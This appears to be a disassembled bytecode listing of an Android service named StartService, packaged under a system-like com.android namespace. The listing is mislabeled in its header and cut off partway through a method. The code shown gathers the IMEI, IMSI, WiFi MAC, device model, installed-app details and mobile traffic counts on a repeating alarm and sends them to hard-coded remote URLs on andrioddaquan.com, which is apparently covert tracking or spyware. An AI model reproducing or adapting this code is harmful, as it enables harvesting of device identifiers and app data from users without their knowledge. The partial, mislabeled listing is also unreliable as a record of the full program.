_____________________________________________________________________
+ Program class: android/net/ConnectivityManager
  Superclass:    java/lang/Object
  + Methodref [android/content/IntentFilter.<init> ()V]
  + Methodref [android/content/IntentFilter.addAction (Ljava/lang/String;)V]
  + Methodref [android/content/pm/ApplicationInfo.loadLabel (Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;]
  + Methodref [android/content/pm/PackageManager.getPackageInfo (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;]
  + Methodref [android/content/pm/PackageManager$NameNotFoundException.printStackTrace ()V]
  + Methodref [android/net/TrafficStats.getMobileRxBytes ()J]
  + Methodref [android/net/TrafficStats.getMobileTxBytes ()J]
  + Methodref [com/android/a/a.<init> ()V]
  + Methodref [com/android/a/c.<init> (Landroid/content/Context;)V]
  + Methodref [com/android/a/c.a ()Lorg/json/JSONArray;]
  + Methodref [com/android/a/c.a (Lcom/android/a/a;)V]
  + Methodref [com/android/a/c.a (Ljava/lang/String;Ljava/lang/String;)V]
  + Methodref [com/android/a/c.b (Ljava/lang/String;Ljava/lang/String;)Z]
  + Methodref [com/android/a/c.d ()Lorg/json/JSONArray;]
  + Methodref [com/android/b/a/c.<init> (Ljava/lang/String;Ljava/util/Map;Lcom/android/b/a/a;)V]
  + Methodref [com/android/b/a/c.start ()V]
  + Methodref [com/android/b/b.a (J)Ljava/lang/String;]
  + Methodref [com/android/b/b.a (Landroid/content/Context;)I]
  + Methodref [com/android/b/b.a (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;]
  + Methodref [com/android/b/b.a (Landroid/net/wifi/WifiManager;)Ljava/lang/String;]
  + Methodref [com/android/b/b.a (Landroid/telephony/TelephonyManager;)Ljava/lang/String;]
  + Methodref [com/android/b/b.a (Ljava/lang/String;I)Z]
  + Methodref [com/android/b/b.b (Landroid/content/Context;Ljava/lang/String;)Z]
  + Methodref [com/android/b/b.b (Landroid/telephony/TelephonyManager;)Ljava/lang/String;]
  + Methodref [com/android/b/d.a ()Lcom/android/b/d;]
  + Methodref [com/android/b/d.a (Landroid/content/Context;)V]
  + Methodref [com/android/b/d.b ()V]
  + Methodref [com/android/b/g.<init> (Landroid/content/Context;)V]
  + Methodref [com/android/b/g.a (Ljava/lang/String;)I]
  + Methodref [com/android/b/g.a (Ljava/lang/String;I)V]
  + Methodref [com/android/b/g.a (Ljava/lang/String;Ljava/lang/Long;)V]
  + Methodref [com/android/b/g.a (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;]
  + Methodref [com/android/b/g.a (Ljava/lang/String;Z)V]
  + Methodref [com/android/b/g.b (Ljava/lang/String;)Z]
  + Methodref [com/android/b/g.b (Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;]
  + Methodref [com/android/b/g.b (Ljava/lang/String;Ljava/lang/String;)V]
  + Methodref [com/android/b/j.a (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;]
  + Methodref [com/android/upload/StartService.a (Ljava/lang/String;J)V]
  + Methodref [com/android/upload/StartService.getApplicationContext ()Landroid/content/Context;]
  + Methodref [com/android/upload/StartService.getPackageManager ()Landroid/content/pm/PackageManager;]
  + Methodref [com/android/upload/StartService.getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
  + Methodref [com/android/upload/StartService.registerReceiver (Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;]
  + Methodref [com/android/upload/StartService.unregisterReceiver (Landroid/content/BroadcastReceiver;)V]
  + Methodref [com/android/upload/a.<init> (Lcom/android/upload/StartService;)V]
  + Methodref [com/android/upload/b.<init> (Lcom/android/upload/StartService;)V]
  + Methodref [com/android/upload/c.<init> (Lcom/android/upload/StartService;)V]
  + Methodref [java/lang/Long.valueOf (J)Ljava/lang/Long;]
  + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
  + Methodref [java/lang/String.length ()I]
  + Methodref [java/lang/String.valueOf (J)Ljava/lang/String;]
  + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
  + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
  + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
  + Methodref [java/lang/System.currentTimeMillis ()J]
  + Methodref [java/security/InvalidKeyException.printStackTrace ()V]
  + Methodref [java/util/HashMap.<init> ()V]
  + Methodref [org/json/JSONException.printStackTrace ()V]
  + Methodref [org/json/JSONObject.<init> ()V]
  + Methodref [org/json/JSONObject.put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
  + Methodref [org/json/JSONObject.toString ()Ljava/lang/String;]
  + InterfaceMethodref [java/lang/CharSequence.toString ()Ljava/lang/String;]
  + InterfaceMethodref [java/util/Map.put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;]
  + NameAndType [<init> ()V]
  + NameAndType [<init> (Landroid/content/Context;)V]
  + NameAndType [<init> (Lcom/android/upload/StartService;)V]
  + NameAndType [<init> (Ljava/lang/String;)V]
  + NameAndType [<init> (Ljava/lang/String;Ljava/util/Map;Lcom/android/b/a/a;)V]
  + NameAndType [BRAND Ljava/lang/String;]
  + NameAndType [MODEL Ljava/lang/String;]
  + NameAndType [a ()Lcom/android/b/d;]
  + NameAndType [a ()Lorg/json/JSONArray;]
  + NameAndType [a (J)Ljava/lang/String;]
  + NameAndType [a (Landroid/content/Context;)I]
  + NameAndType [a (Landroid/content/Context;)V]
  + NameAndType [a (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;]
  + NameAndType [a (Landroid/net/wifi/WifiManager;)Ljava/lang/String;]
  + NameAndType [a (Landroid/telephony/TelephonyManager;)Ljava/lang/String;]
  + NameAndType [a (Lcom/android/a/a;)V]
  + NameAndType [a (Ljava/lang/String;)I]
  + NameAndType [a (Ljava/lang/String;I)V]
  + NameAndType [a (Ljava/lang/String;I)Z]
  + NameAndType [a (Ljava/lang/String;J)V]
  + NameAndType [a (Ljava/lang/String;Ljava/lang/Long;)V]
  + NameAndType [a (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;]
  + NameAndType [a (Ljava/lang/String;Ljava/lang/String;)V]
  + NameAndType [a (Ljava/lang/String;Z)V]
  + NameAndType [a Lcom/android/b/d;]
  + NameAndType [addAction (Ljava/lang/String;)V]
  + NameAndType [append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
  + NameAndType [applicationInfo Landroid/content/pm/ApplicationInfo;]
  + NameAndType [b ()V]
  + NameAndType [b (Landroid/content/Context;Ljava/lang/String;)Z]
  + NameAndType [b (Landroid/telephony/TelephonyManager;)Ljava/lang/String;]
  + NameAndType [b (Ljava/lang/String;)Z]
  + NameAndType [b (Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;]
  + NameAndType [b (Ljava/lang/String;Ljava/lang/String;)V]
  + NameAndType [b (Ljava/lang/String;Ljava/lang/String;)Z]
  + NameAndType [b Landroid/telephony/TelephonyManager;]
  + NameAndType [b Ljava/lang/String;]
  + NameAndType [c Lcom/android/b/g;]
  + NameAndType [c Ljava/lang/String;]
  + NameAndType [currentTimeMillis ()J]
  + NameAndType [d ()Lorg/json/JSONArray;]
  + NameAndType [d Lcom/android/a/c;]
  + NameAndType [d Ljava/lang/String;]
  + NameAndType [e Lcom/android/b/a/c;]
  + NameAndType [equals (Ljava/lang/Object;)Z]
  + NameAndType [f Lcom/android/b/a/c;]
  + NameAndType [g Landroid/net/ConnectivityManager;]
  + NameAndType [getApplicationContext ()Landroid/content/Context;]
  + NameAndType [getBroadcast (Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;]
  + NameAndType [getDataString ()Ljava/lang/String;]
  + NameAndType [getMobileRxBytes ()J]
  + NameAndType [getMobileTxBytes ()J]
  + NameAndType [getPackageInfo (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;]
  + NameAndType [getPackageManager ()Landroid/content/pm/PackageManager;]
  + NameAndType [getStringExtra (Ljava/lang/String;)Ljava/lang/String;]
  + NameAndType [getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
  + NameAndType [h Landroid/net/wifi/WifiManager;]
  + NameAndType [i Landroid/app/AlarmManager;]
  + NameAndType [j Landroid/app/PendingIntent;]
  + NameAndType [k Lcom/android/upload/c;]
  + NameAndType [length ()I]
  + NameAndType [loadLabel (Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;]
  + NameAndType [onCreate ()V]
  + NameAndType [onDestroy ()V]
  + NameAndType [printStackTrace ()V]
  + NameAndType [put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;]
  + NameAndType [put (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
  + NameAndType [registerReceiver (Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;]
  + NameAndType [set (IJLandroid/app/PendingIntent;)V]
  + NameAndType [start ()V]
  + NameAndType [toString ()Ljava/lang/String;]
  + NameAndType [unregisterReceiver (Landroid/content/BroadcastReceiver;)V]
  + NameAndType [valueOf (J)Ljava/lang/Long;]
  + NameAndType [valueOf (J)Ljava/lang/String;]
  + NameAndType [versionName Ljava/lang/String;]
  + Utf8 []
  + Utf8 [ later send broadcast! action=]
  + Utf8 [()I]
  + Utf8 [()J]
  + Utf8 [()Landroid/content/Context;]
  + Utf8 [()Landroid/content/pm/PackageManager;]
  + Utf8 [()Lcom/android/b/d;]
  + Utf8 [()Ljava/lang/String;]
  + Utf8 [()Lorg/json/JSONArray;]
  + Utf8 [()V]
  + Utf8 [(IJLandroid/app/PendingIntent;)V]
  + Utf8 [(J)Ljava/lang/Long;]
  + Utf8 [(J)Ljava/lang/String;]
  + Utf8 [(Landroid/content/BroadcastReceiver;)V]
  + Utf8 [(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;]
  + Utf8 [(Landroid/content/Context;)I]
  + Utf8 [(Landroid/content/Context;)V]
  + Utf8 [(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;]
  + Utf8 [(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;]
  + Utf8 [(Landroid/content/Context;Ljava/lang/String;)Z]
  + Utf8 [(Landroid/content/Intent;)Landroid/os/IBinder;]
  + Utf8 [(Landroid/content/Intent;II)I]
  + Utf8 [(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;]
  + Utf8 [(Landroid/net/wifi/WifiManager;)Ljava/lang/String;]
  + Utf8 [(Landroid/telephony/TelephonyManager;)Ljava/lang/String;]
  + Utf8 [(Lcom/android/a/a;)V]
  + Utf8 [(Lcom/android/upload/StartService;)Landroid/net/ConnectivityManager;]
  + Utf8 [(Lcom/android/upload/StartService;)Lcom/android/b/g;]
  + Utf8 [(Lcom/android/upload/StartService;)V]
  + Utf8 [(Lcom/android/upload/StartService;)Z]
  + Utf8 [(Lcom/android/upload/StartService;Ljava/lang/String;J)V]
  + Utf8 [(Ljava/lang/Object;)Z]
  + Utf8 [(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;]
  + Utf8 [(Ljava/lang/String;)I]
  + Utf8 [(Ljava/lang/String;)Ljava/lang/Object;]
  + Utf8 [(Ljava/lang/String;)Ljava/lang/String;]
  + Utf8 [(Ljava/lang/String;)Ljava/lang/StringBuilder;]
  + Utf8 [(Ljava/lang/String;)V]
  + Utf8 [(Ljava/lang/String;)Z]
  + Utf8 [(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;]
  + Utf8 [(Ljava/lang/String;I)V]
  + Utf8 [(Ljava/lang/String;I)Z]
  + Utf8 [(Ljava/lang/String;J)V]
  + Utf8 [(Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;]
  + Utf8 [(Ljava/lang/String;Ljava/lang/Long;)V]
  + Utf8 [(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;]
  + Utf8 [(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;]
  + Utf8 [(Ljava/lang/String;Ljava/lang/String;)V]
  + Utf8 [(Ljava/lang/String;Ljava/lang/String;)Z]
  + Utf8 [(Ljava/lang/String;Ljava/util/Map;Lcom/android/b/a/a;)V]
  + Utf8 [(Ljava/lang/String;Z)V]
  + Utf8 [--]
  + Utf8 [<init>]
  + Utf8 [BRAND]
  + Utf8 [Code]
  + Utf8 [InstallInfo]
  + Utf8 [Landroid/app/AlarmManager;]
  + Utf8 [Landroid/app/PendingIntent;]
  + Utf8 [Landroid/content/pm/ApplicationInfo;]
  + Utf8 [Landroid/net/ConnectivityManager;]
  + Utf8 [Landroid/net/wifi/WifiManager;]
  + Utf8 [Landroid/telephony/TelephonyManager;]
  + Utf8 [Lcom/android/a/c;]
  + Utf8 [Lcom/android/b/a/c;]
  + Utf8 [Lcom/android/b/d;]
  + Utf8 [Lcom/android/b/g;]
  + Utf8 [Lcom/android/upload/c;]
  + Utf8 [Ljava/lang/String;]
  + Utf8 [MODEL]
  + Utf8 [StackMapTable]
  + Utf8 [Top@^囧34]
  + Utf8 [TrafficInfo]
  + Utf8 [a]
  + Utf8 [aciton_nwc]
  + Utf8 [aciton_nwo]
  + Utf8 [aciton_nwt]
  + Utf8 [addAction]
  + Utf8 [alarm]
  + Utf8 [android/app/AlarmManager]
  + Utf8 [android/app/PendingIntent]
  + Utf8 [android/app/Service]
  + Utf8 [android/content/Context]
  + Utf8 [android/content/Intent]
  + Utf8 [android/content/IntentFilter]
  + Utf8 [android/content/pm/ApplicationInfo]
  + Utf8 [android/content/pm/PackageInfo]
  + Utf8 [android/content/pm/PackageManager]
  + Utf8 [android/content/pm/PackageManager$NameNotFoundException]
  + Utf8 [android/net/ConnectivityManager]
  + Utf8 [android/net/TrafficStats]
  + Utf8 [android/net/wifi/WifiManager]
  + Utf8 [android/os/Build]
  + Utf8 [android/telephony/TelephonyManager]
  + Utf8 [android_data_cid]
  + Utf8 [android_traffic_stats]
  + Utf8 [apk_uninstalled]
  + Utf8 [app_info]
  + Utf8 [app_info1=]
  + Utf8 [app_info2=]
  + Utf8 [append]
  + Utf8 [applicationInfo]
  + Utf8 [b]
  + Utf8 [brand]
  + Utf8 [c]
  + Utf8 [cid]
  + Utf8 [com/android/a/a]
  + Utf8 [com/android/a/c]
  + Utf8 [com/android/b/a/c]
  + Utf8 [com/android/b/b]
  + Utf8 [com/android/b/d]
  + Utf8 [com/android/b/g]
  + Utf8 [com/android/b/j]
  + Utf8 [com/android/upload/StartService]
  + Utf8 [com/android/upload/a]
  + Utf8 [com/android/upload/b]
  + Utf8 [com/android/upload/c]
  + Utf8 [connectivity]
  + Utf8 [currentTimeMillis]
  + Utf8 [d]
  + Utf8 [e]
  + Utf8 [equals]
  + Utf8 [f]
  + Utf8 [g]
  + Utf8 [getApplicationContext]
  + Utf8 [getBroadcast]
  + Utf8 [getDataString]
  + Utf8 [getMobileRxBytes]
  + Utf8 [getMobileTxBytes]
  + Utf8 [getPackageInfo]
  + Utf8 [getPackageManager]
  + Utf8 [getStringExtra]
  + Utf8 [getSystemService]
  + Utf8 [h]
  + Utf8 [http://a.andrioddaquan.com/AppFlowInfo.aspx]
  + Utf8 [http://a.andrioddaquan.com/AppInstallInfo.aspx]
  + Utf8 [i]
  + Utf8 [imei]
  + Utf8 [imsi]
  + Utf8 [installTime=]
  + Utf8 [install_time]
  + Utf8 [j]
  + Utf8 [java/lang/CharSequence]
  + Utf8 [java/lang/Long]
  + Utf8 [java/lang/String]
  + Utf8 [java/lang/StringBuilder]
  + Utf8 [java/lang/System]
  + Utf8 [java/security/InvalidKeyException]
  + Utf8 [java/util/HashMap]
  + Utf8 [java/util/Map]
  + Utf8 [k]
  + Utf8 [key_last_traffic]
  + Utf8 [key_open_nwcount]
  + Utf8 [key_open_nwtime]
  + Utf8 [key_traffic]
  + Utf8 [key_upload_app_count]
  + Utf8 [key_upload_app_last_time]
  + Utf8 [key_upload_app_success]
  + Utf8 [lastTime=]
  + Utf8 [length]
  + Utf8 [loadLabel]
  + Utf8 [mac]
  + Utf8 [model]
  + Utf8 [need_open]
  + Utf8 [onBind]
  + Utf8 [onCreate]
  + Utf8 [onDestroy]
  + Utf8 [onStartCommand]
  + Utf8 [onStartCommand!]
  + Utf8 [org/json/JSONException]
  + Utf8 [org/json/JSONObject]
  + Utf8 [phone]
  + Utf8 [pkgName=]
  + Utf8 [pkg_name]
  + Utf8 [printStackTrace]
  + Utf8 [put]
  + Utf8 [registerReceiver]
  + Utf8 [set]
  + Utf8 [start]
  + Utf8 [toString]
  + Utf8 [traffic_app]
  + Utf8 [traffic_info1=]
  + Utf8 [traffic_info2=]
  + Utf8 [traffic_total]
  + Utf8 [uninstall pkgName=]
  + Utf8 [unregisterReceiver]
  + Utf8 [valueOf]
  + Utf8 [versionName]
  + Utf8 [wifi]

Fields (count = 11):
  + Field:        b Landroid/telephony/TelephonyManager;
    Access flags: 0x2
      = private android.telephony.TelephonyManager b
  + Field:        c Lcom/android/b/g;
    Access flags: 0x2
      = private com.android.b.g c
  + Field:        d Lcom/android/a/c;
    Access flags: 0x2
      = private com.android.a.c d
  + Field:        e Lcom/android/b/a/c;
    Access flags: 0x2
      = private com.android.b.a.c e
  + Field:        f Lcom/android/b/a/c;
    Access flags: 0x2
      = private com.android.b.a.c f
  + Field:        g Landroid/net/ConnectivityManager;
    Access flags: 0x2
      = private android.net.ConnectivityManager g
  + Field:        h Landroid/net/wifi/WifiManager;
    Access flags: 0x2
      = private android.net.wifi.WifiManager h
  + Field:        i Landroid/app/AlarmManager;
    Access flags: 0x2
      = private android.app.AlarmManager i
  + Field:        j Landroid/app/PendingIntent;
    Access flags: 0x2
      = private android.app.PendingIntent j
  + Field:        k Lcom/android/upload/c;
    Access flags: 0x2
      = private com.android.upload.c k
  + Field:        a Lcom/android/b/d;
    Access flags: 0x0
      = com.android.b.d a

Methods (count = 14):
  - Method:       <init>()V
    Access flags: 0x1
      = public StartService()
    Class member attributes (count = 1):
    + Code attribute instructions (code length = 10, locals = 1, stack = 2):
      [0] aload_0 v0
      [1] invokespecial #106
        + Methodref [android/app/Service.<init> ()V]
      [4] aload_0 v0
      [5] aconst_null
      [6] putfield #103
        + Fieldref [com/android/upload/StartService.k Lcom/android/upload/c;]
      [9] return
      Code attribute exceptions (count = 0):
      Code attribute attributes (attribute count = 0):
  + Method:       onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    Access flags: 0x1
      = public android.os.IBinder onBind(android.content.Intent)
    Class member attributes (count = 1):
    + Code attribute instructions (code length = 2, locals = 2, stack = 1):
      [0] aconst_null
      [1] areturn
      Code attribute exceptions (count = 0):
      Code attribute attributes (attribute count = 0):
  + Method:       onCreate()V
    Access flags: 0x1
      = public void onCreate()
    Class member attributes (count = 1):
    + Code attribute instructions (code length = 166, locals = 2, stack = 4):
      [0] aload_0 v0
      [1] invokespecial #107
        + Methodref [android/app/Service.onCreate ()V]
      [4] aload_0 v0
      [5] invokestatic #138
        + Methodref [com/android/b/d.a ()Lcom/android/b/d;]
      [8] putfield #93
        + Fieldref [com/android/upload/StartService.a Lcom/android/b/d;]
      [11] aload_0 v0
      [12] getfield #93
        + Fieldref [com/android/upload/StartService.a Lcom/android/b/d;]
      [15] aload_0 v0
      [16] invokevirtual #152
        + Methodref [com/android/upload/StartService.getApplicationContext ()Landroid/content/Context;]
      [19] invokevirtual #139
        + Methodref [com/android/b/d.a (Landroid/content/Context;)V]
      [22] aload_0 v0
      [23] new #68
        + Class [com/android/b/g]
      [26] dup
      [27] aload_0 v0
      [28] invokespecial #141
        + Methodref [com/android/b/g.<init> (Landroid/content/Context;)V]
      [31] putfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [34] aload_0 v0
      [35] new #64
        + Class [com/android/a/c]
      [38] dup
      [39] aload_0 v0
      [40] invokespecial #122
        + Methodref [com/android/a/c.<init> (Landroid/content/Context;)V]
      [43] putfield #96
        + Fieldref [com/android/upload/StartService.d Lcom/android/a/c;]
      [46] aload_0 v0
      [47] aload_0 v0
      [48] ldc #39
        + String [phone]
      [50] invokevirtual #154
        + Methodref [com/android/upload/StartService.getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
      [53] checkcast #62
        + Class [android/telephony/TelephonyManager]
      [56] putfield #94
        + Fieldref [com/android/upload/StartService.b Landroid/telephony/TelephonyManager;]
      [59] aload_0 v0
      [60] aload_0 v0
      [61] ldc #11
        + String [alarm]
      [63] invokevirtual #154
        + Methodref [com/android/upload/StartService.getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
      [66] checkcast #48
        + Class [android/app/AlarmManager]
      [69] putfield #101
        + Fieldref [com/android/upload/StartService.i Landroid/app/AlarmManager;]
      [72] aload_0 v0
      [73] aload_0 v0
      [74] ldc #20
        + String [connectivity]
      [76] invokevirtual #154
        + Methodref [com/android/upload/StartService.getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
      [79] checkcast #58
        + Class [android/net/ConnectivityManager]
      [82] putfield #99
        + Fieldref [com/android/upload/StartService.g Landroid/net/ConnectivityManager;]
      [85] aload_0 v0
      [86] aload_0 v0
      [87] ldc #47
        + String [wifi]
      [89] invokevirtual #154
        + Methodref [com/android/upload/StartService.getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
      [92] checkcast #60
        + Class [android/net/wifi/WifiManager]
      [95] putfield #100
        + Fieldref [com/android/upload/StartService.h Landroid/net/wifi/WifiManager;]
      [98] aload_0 v0
      [99] ldc #37
        + String [need_open]
      [101] invokestatic #136
        + Methodref [com/android/b/b.b (Landroid/content/Context;Ljava/lang/String;)Z]
      [104] ifne +4 (target=108)
      [107] return
      [108] aload_0 v0
      [109] new #73
        + Class [com/android/upload/c]
      [112] dup
      [113] aload_0 v0
      [114] invokespecial #159
        + Methodref [com/android/upload/c.<init> (Lcom/android/upload/StartService;)V]
      [117] putfield #103
        + Fieldref [com/android/upload/StartService.k Lcom/android/upload/c;]
      [120] new #53
        + Class [android/content/IntentFilter]
      [123] dup
      [124] invokespecial #114
        + Methodref [android/content/IntentFilter.<init> ()V]
      [127] dup
      [128] astore_1 v1
      [129] ldc #10
        + String [aciton_nwt]
      [131] invokevirtual #115
        + Methodref [android/content/IntentFilter.addAction (Ljava/lang/String;)V]
      [134] aload_1 v1
      [135] ldc #9
        + String [aciton_nwo]
      [137] invokevirtual #115
        + Methodref [android/content/IntentFilter.addAction (Ljava/lang/String;)V]
      [140] aload_1 v1
      [141] ldc #8
        + String [aciton_nwc]
      [143] invokevirtual #115
        + Methodref [android/content/IntentFilter.addAction (Ljava/lang/String;)V]
      [146] aload_0 v0
      [147] aload_0 v0
      [148] getfield #103
        + Fieldref [com/android/upload/StartService.k Lcom/android/upload/c;]
      [151] aload_1 v1
      [152] invokevirtual #155
        + Methodref [com/android/upload/StartService.registerReceiver (Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;]
      [155] pop
      [156] aload_0 v0
      [157] ldc #10
        + String [aciton_nwt]
      [159] ldc2_w #84
        + Long [7200000]
      [162] invokespecial #151
        + Methodref [com/android/upload/StartService.a (Ljava/lang/String;J)V]
      [165] return
      Code attribute exceptions (count = 0):
      Code attribute attributes (attribute count = 1):
      + Stack map table attribute (count = 1):
        - [108] Var: ...[i], Stack: (empty)
  + Method:       onDestroy()V
    Access flags: 0x1
      = public void onDestroy()
    Class member attributes (count = 1):
    + Code attribute instructions (code length = 20, locals = 1, stack = 2):
      [0] aload_0 v0
      [1] getfield #103
        + Fieldref [com/android/upload/StartService.k Lcom/android/upload/c;]
      [4] ifnull +11 (target=15)
      [7] aload_0 v0
      [8] aload_0 v0
      [9] getfield #103
        + Fieldref [com/android/upload/StartService.k Lcom/android/upload/c;]
      [12] invokevirtual #156
        + Methodref [com/android/upload/StartService.unregisterReceiver (Landroid/content/BroadcastReceiver;)V]
      [15] aload_0 v0
      [16] invokespecial #108
        + Methodref [android/app/Service.onDestroy ()V]
      [19] return
      Code attribute exceptions (count = 0):
      Code attribute attributes (attribute count = 1):
      + Stack map table attribute (count = 1):
        - [15] Var: ..., Stack: (empty)
  + Method:       onStartCommand(Landroid/content/Intent;II)I
    Access flags: 0x1
      = public int onStartCommand(android.content.Intent,int,int)
    Class member attributes (count = 1):
    + Code attribute instructions (code length = 1007, locals = 5, stack = 8):
      [0] new #77
        + Class [java/lang/StringBuilder]
      [3] dup
      [4] ldc #38
        + String [onStartCommand!]
      [6] invokespecial #164
        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
      [9] aload_1 v1
      [10] invokevirtual #113
        + Methodref [android/content/Intent.toString ()Ljava/lang/String;]
      [13] invokevirtual #165
        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
      [16] ldc #4
        + String [--]
      [18] invokevirtual #165
        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
      [21] aload_1 v1
      [22] invokevirtual #111
        + Methodref [android/content/Intent.getDataString ()Ljava/lang/String;]
      [25] invokevirtual #165
        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
      [28] invokevirtual #166
        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
      [31] pop
      [32] aload_1 v1
      [33] ifnull +263 (target=296)
      [36] aload_1 v1
      [37] ldc #26
        + String [install_time]
      [39] invokevirtual #112
        + Methodref [android/content/Intent.getStringExtra (Ljava/lang/String;)Ljava/lang/String;]
      [42] dup
      [43] astore_2 v2
      [44] ifnull +81 (target=125)
      [47] aload_2 v2
      [48] invokevirtual #162
        + Methodref [java/lang/String.length ()I]
      [51] ifle +72 (target=123)
      [54] new #77
        + Class [java/lang/StringBuilder]
      [57] dup
      [58] ldc #25
        + String [installTime=]
      [60] invokespecial #164
        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
      [63] aload_2 v2
      [64] invokevirtual #165
        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
      [67] invokevirtual #166
        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
      [70] pop
      [71] aload_0 v0
      [72] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [75] ldc #26
        + String [install_time]
      [77] aload_2 v2
      [78] invokevirtual #149
        + Methodref [com/android/b/g.b (Ljava/lang/String;Ljava/lang/String;)V]
      [81] aload_0 v0
      [82] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [85] ldc #27
        + String [key_last_traffic]
      [87] invokestatic #119
        + Methodref [android/net/TrafficStats.getMobileRxBytes ()J]
      [90] invokestatic #120
        + Methodref [android/net/TrafficStats.getMobileTxBytes ()J]
      [93] ladd
      [94] invokestatic #160
        + Methodref [java/lang/Long.valueOf (J)Ljava/lang/Long;]
      [97] invokevirtual #144
        + Methodref [com/android/b/g.a (Ljava/lang/String;Ljava/lang/Long;)V]
      [100] aload_0 v0
      [101] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [104] ldc #30
        + String [key_traffic]
      [106] lconst_0
      [107] invokestatic #160
        + Methodref [java/lang/Long.valueOf (J)Ljava/lang/Long;]
      [110] invokevirtual #144
        + Methodref [com/android/b/g.a (Ljava/lang/String;Ljava/lang/Long;)V]
      [113] aload_0 v0
      [114] getfield #95
        + Fieldref [com/android/upload/StartService.c Lcom/android/b/g;]
      [117] ldc #32
        + String [key_upload_app_last_time]
      [119] aload_2 v2
      [120] invokevirtual #149
        + Methodref [com/android/b/g.b (Ljava/lang/String;Ljava/lang/String;)V]
      [123] iconst_1
      [124] ireturn
      [125] aload_1 v1
      [126] ldc #41
        + String [pkg_name]
      [128] invokevirtual #112
